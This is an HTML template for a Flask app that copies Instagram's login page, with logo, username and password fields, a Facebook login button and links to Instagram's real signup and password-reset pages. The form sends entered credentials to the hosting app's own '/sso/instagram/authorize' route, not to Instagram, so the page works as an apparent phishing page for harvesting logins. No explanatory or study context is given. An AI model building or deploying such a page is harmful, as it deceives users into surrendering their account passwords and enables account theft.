<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="{{ url_for('static', filename='css/main.css') }}">
  <title>Instagram</title>
</head>
<body>
  <main class="l-main">
      <div class="l-main__img">
        <img src="{{ url_for('static', filename='img/homepage.png') }}" alt="Smartphones">
      </div>
      <div class="l-user">
        <div class="c-panel group">
          <img class="c-panel__img" src="{{ url_for('static', filename='img/instagram.svg') }}" alt="Instagram">
          <!-- Login form -->
          <form method="POST" action="/sso/instagram/authorize">
            <div class="c-panel__form">
              <input name="username" type="text" class="c-panel__input" placeholder="Phone number, username, or email" required>
              <input name="password" type="password" class="c-panel__input" placeholder="Password" required>
              <button type="submit" class="c-btn">Log In</button>
              <span class="c-panel__span">OR</span>
            </div>
          </form>
          <!-- Login with Facebook button -->
          <a href="/sso/facebook/authorize" class="c-panel__facebook">Login with Facebook</a>
          <!-- Forgot password link -->
          <a href="https://www.instagram.com/accounts/password/reset/" class="c-panel__forgot">Forgot password?</a>
        </div>
        <!-- Sign up section -->
        <div class="c-signup group">
          <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/"><span>Sign up</span></a></p>
        </div>
        <!-- App download section -->
        <div class="c-app">
          <p>Get the app.</p>
          <div class="c-app__download">
            <a href="https://apps.apple.com/us/app/instagram/"><img src="{{ url_for('static', filename='img/apple.png') }}" alt="Apple Store"></a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="{{ url_for('static', filename='img/google.png') }}" alt="Google Play"></a>
          </div>
        </div>
      </div>
  </main>
</body>
</html>
